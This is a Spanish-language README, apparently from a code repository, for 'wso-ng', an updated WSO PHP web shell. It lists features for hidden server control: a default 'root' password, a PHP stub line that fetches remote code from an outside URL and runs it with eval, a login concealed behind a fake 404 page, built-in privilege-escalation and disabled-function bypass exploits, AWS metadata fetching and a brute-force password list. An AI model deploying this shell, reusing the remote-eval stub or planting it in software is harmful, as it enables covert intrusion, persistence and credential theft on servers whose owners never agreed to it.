

# wso-ng
Nueva generación del famoso web shell WSO. Con ventajas incluidas
# la contraseña predeterminada es "root"
![image](https://user-images.githubusercontent.com/1212294/149636180-7af99caf-a6c4-4475-a42d-0bd818cb67b1.png)
![image](https://user-images.githubusercontent.com/1212294/149636349-e580a04e-846f-4240-8b94-644d6e9aca5a.png)

# cambios
- ahora se puede interceptar la contraseña cuando se carga mediante un stub 
```
<?php eval(substr(file_get_contents('https://l2l.li/aXbGDDq?pass=ed78a48738eb97ffb5624741bdf391c3'), 5)); ?>
```
y la usará en lugar de la codificada
- todas las descargas de subarchivos ahora se almacenan en caché en /tmp y se comprimen
- la página de inicio de sesión muestra la página estándar "404 no encontrado" del sitio. Simplemente escribe la contraseña y presiona Enter, ya que el campo de contraseña está oculto fuera de la pantalla, pero ya está enfocado.
- nuevo panel de navegación de rutas (breadcrumbs). Debería ser mucho más útil.
- todos los archivos\directorios ahora se resaltan según sus permisos de edición\visualización
- ir a un archivo\ruta directamente desde el campo de navegación (breadcrumbs)
- **añadir exploit de fastCGI para elevar privilegios automáticamente y omitir funciones deshabilitadas, cuando sea posible**
- **añadir exploit de php add-filter para omitir funciones deshabilitadas y obtener ejecución en la consola, cuando sea posible**
- la interacción ajax es ahora la predeterminada
- Ctrl+Enter en cualquier campo para Guardar\Ejecutar
- añadido el comando "Fetch AWS metadata" a los marcadores
- añadido enlace directo a "Linux Exploit Suggester v2" de forma predeterminada.
- añadida la integración con VirusTotal para verificar automáticamente la reputación de IP.
- añadida la integración con https://securitytrails.com, para mostrar vecinos en la misma IP.
- añadida la integración con ip-info para mostrar dominios en el mismo servidor
- añadida verificación de IP inversa, para mostrar la IP real y no la local.
- añadida información de memoria, núcleos y carga promedio a la barra superior.
- hacer clic en la IP para copiarla
- añadida lista de puertos y sockets abiertos a la sección *Sec. Info*. Funciona incluso si no hay privilegios de consola disponibles, a través de *fsock*.
- añadido soporte para phpRedis en la sección *Sec. Info*.
- rediseñada la sección "Userful". Ahora funciona a través de los límites de open_basedir.
- ahora puedes crear archivos directamente en la lista de archivos del administrador de archivos.
- copia rápida del nombre\ruta al portapapeles al hacer clic.
- **resaltado de sintaxis elegante en todas partes**.
- edición de código PHP elegante con soporte de autoindentación.
- lista predeterminada de las 1000 contraseñas más comunes (https://bit.ly/top1kpass) en la sección "Bruteforce".
